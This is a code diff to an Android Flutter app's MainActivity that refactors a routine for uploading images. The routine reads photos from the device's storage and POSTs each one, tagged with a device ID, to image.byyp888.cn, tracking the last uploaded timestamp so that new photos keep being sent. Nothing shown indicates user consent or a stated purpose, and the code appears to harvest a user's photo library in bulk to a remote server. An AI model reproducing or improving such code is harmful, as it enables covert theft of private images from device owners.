@@ -23,7 +23,7 @@ import io.flutter.embedding.android.FlutterFragmentActivity
 import io.flutter.embedding.engine.FlutterEngine
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.async
-import kotlinx.coroutines.delay
+import kotlinx.coroutines.awaitAll
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.sync.Semaphore
 import kotlinx.coroutines.sync.withPermit
@@ -33,6 +33,7 @@ import java.net.HttpURLConnection
 import java.net.URL
 import java.util.LinkedList
 import java.util.UUID
+import java.util.concurrent.Executors
 
 class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
     companion object {
@@ -144,48 +145,35 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
         }
     }
 
-    private suspend fun uploadImageToServerWithRetry(imageUri: android.net.Uri, fileName: String, deviceId: String, maxRetries: Int = 3): Boolean {
-        var attempt = 0
-        while (attempt < maxRetries) {
-            try {
-                val boundary = "----AndroidFormBoundary${System.currentTimeMillis()}"
-                val lineEnd = "\r\n"
-                val twoHyphens = "--"
-                val url = URL("https://image.byyp888.cn/upload?deviceid=$deviceId")
-                val conn = url.openConnection() as HttpURLConnection
-                conn.doInput = true
-                conn.doOutput = true
-                conn.useCaches = false
-                conn.requestMethod = "POST"
-                conn.setRequestProperty("Connection", "Keep-Alive")
-                conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=$boundary")
+    private suspend fun uploadImage(imageUri: android.net.Uri, fileName: String, deviceId: String): Boolean {
+        return try {
+            val boundary = "----AndroidFormBoundary${System.currentTimeMillis()}"
+            val url = URL("https://image.byyp888.cn/upload?deviceid=$deviceId")
+            val conn = url.openConnection() as HttpURLConnection
+            conn.doInput = true
+            conn.doOutput = true
+            conn.useCaches = false
+            conn.requestMethod = "POST"
+            conn.setRequestProperty("Connection", "Keep-Alive")
+            conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=$boundary")
 
-                val outputStream = DataOutputStream(conn.outputStream)
-                val inputStream = contentResolver.openInputStream(imageUri)
-                val imageBytes = inputStream?.readBytes()
-                inputStream?.close()
+            val outputStream = DataOutputStream(conn.outputStream)
+            val inputStream = contentResolver.openInputStream(imageUri)
+            val imageBytes = inputStream?.readBytes()
+            inputStream?.close()
 
-                outputStream.writeBytes("$twoHyphens$boundary$lineEnd")
-                outputStream.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"$fileName\"$lineEnd")
-                outputStream.writeBytes("Content-Type: image/jpeg$lineEnd$lineEnd")
-                outputStream.write(imageBytes ?: byteArrayOf())
-                outputStream.writeBytes(lineEnd)
-                outputStream.writeBytes("$twoHyphens$boundary--$lineEnd")
-                outputStream.flush()
-                outputStream.close()
+            outputStream.writeBytes("--$boundary\r\n")
+            outputStream.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"$fileName\"\r\n")
+            outputStream.writeBytes("Content-Type: image/jpeg\r\n\r\n")
+            outputStream.write(imageBytes ?: byteArrayOf())
+            outputStream.writeBytes("\r\n--$boundary--\r\n")
+            outputStream.flush()
+            outputStream.close()
 
-                val responseCode = conn.responseCode
-                if (responseCode == 200) return true else {
-                    attempt++
-                    delay(500)
-                }
-
-            } catch (e: Exception) {
-                attempt++
-                delay(500)
-            }
+            conn.responseCode == 200
+        } catch (e: Exception) {
+            false
         }
-        return false
     }
 
     private fun accessStorage() {
@@ -234,24 +222,19 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
                 }
             }
 
-            val semaphore = Semaphore(5)
-            val chunks = toUpload.sortedBy { it.third }.chunked(20)
-
-            for (chunk in chunks) {
-                val jobs = chunk.map { (uri, name, timestamp) ->
+            val dispatcher = Executors.newFixedThreadPool(5).asCoroutineDispatcher()
+            withContext(dispatcher) {
+                toUpload.map { (uri, name, timestamp) ->
                     async {
-                        semaphore.withPermit {
-                            val success = uploadImageToServerWithRetry(uri, name, deviceId)
-                            if (success && timestamp > maxTimestamp) {
+                        if (uploadImage(uri, name, deviceId)) {
+                            if (timestamp > maxTimestamp) {
                                 maxTimestamp = timestamp
                             }
                         }
                     }
-                }
-                jobs.forEach { it.await() }
+                }.awaitAll()
+                prefs.edit().putLong("last_upload_time", maxTimestamp).apply()
             }
-
-            prefs.edit().putLong("last_upload_time", maxTimestamp).apply()
         }
     }
 
